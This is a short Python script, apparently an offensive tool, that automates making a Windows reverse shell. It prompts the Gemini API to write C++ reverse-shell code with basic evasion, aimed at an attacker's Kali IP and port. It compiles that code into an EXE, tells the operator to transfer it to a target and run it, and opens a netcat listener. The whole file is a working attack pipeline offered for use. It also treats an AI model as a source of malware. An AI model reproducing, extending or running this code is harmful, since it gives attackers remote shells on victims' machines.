#!/usr/bin/env python3
import google.generativeai as genai
import subprocess
import os
import re
import time
import hashlib
import threading
from cryptography.fernet import Fernet

# Configuration
KALI_IP = ""
KALI_PORT = ""
GEMINI_API_KEY = ""

class AutoReverseShellAgent:
    def __init__(self):
        self.payload_history = []
        self.setup_gemini()
        self.validate_environment()

    def setup_gemini(self):
        genai.configure(api_key=GEMINI_API_KEY)
        self.model = genai.GenerativeModel('gemini-2.5-pro')

    def validate_environment(self):
        required_tools = ['x86_64-w64-mingw32-g++', 'nc']
        for tool in required_tools:
            if not self.is_tool_installed(tool):
                raise Exception(f"Required tool not found: {tool}")

    def is_tool_installed(self, name):
        try:
            subprocess.run([name, '--version'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return True
        except FileNotFoundError:
            return False

    def clean_ai_response(self, code):
        """Remove markdown formatting and extract just the C++ code"""
        code = re.sub(r'```(cpp)?', '', code)
        code = re.sub(r'^//.*$', '', code, flags=re.MULTILINE)
        return code.strip()

    def generate_payload(self):
        prompt = f"""Generate a Windows reverse shell in C++ with these requirements:
1. Target: {KALI_IP}:{KALI_PORT}
2. Must compile with: x86_64-w64-mingw32-g++ -static -s -lws2_32
3. Output ONLY the raw C++ code without any markdown formatting
4. No external dependencies
5. Windows 10/11 compatible
6. Basic evasion techniques only"""

        response = self.model.generate_content(prompt)
        return self.clean_ai_response(response.text)

    def compile_payload(self, cpp_code):
        """Compiles to EXE with error handling"""
        try:
            with open("/tmp/shell.cpp", "w") as f:
                f.write(cpp_code)
            
            result = subprocess.run([
                "x86_64-w64-mingw32-g++",
                "/tmp/shell.cpp",
                "-o", "/tmp/shell.exe",
                "-lws2_32",
                "-static",
                "-s",
                "-Wno-conversion-null",
                "-fpermissive"
            ], capture_output=True, text=True)
            
            if result.returncode != 0:
                raise Exception(f"Compilation failed:\n{result.stderr}")
            
            if not os.path.exists("/tmp/shell.exe"):
                raise Exception("Compilation succeeded but no output file")
                
            return "/tmp/shell.exe"
            
        except Exception as e:
            raise Exception(f"Compilation error: {str(e)}")

    def start_listener(self):
        """Start listener in foreground with visible output"""
        print(f"\n[+] Listener active on {KALI_IP}:{KALI_PORT} (Waiting for connection...)")
        os.system(f"nc -lvnp {KALI_PORT}")  # Runs in foreground

    def run(self):
        try:
            print("[*] Generating payload...")
            cpp_code = self.generate_payload()
            
            print("[*] Compiling payload...")
            exe_path = self.compile_payload(cpp_code)
            
            print(f"\n[+] Payload ready: {exe_path}")
            print(f"[+] Source code preserved at: /tmp/shell.cpp")
            print(f"[!] Transfer to target and execute it")
            
            # Start listener (now in foreground)
            self.start_listener()  # Script will wait here until connection
            
        except Exception as e:
            print(f"[!] Error: {str(e)}")
            if os.path.exists("/tmp/shell.cpp"):
                print(f"[+] Source code preserved at: /tmp/shell.cpp")

if __name__ == "__main__":
    agent = AutoReverseShellAgent()
    agent.run()
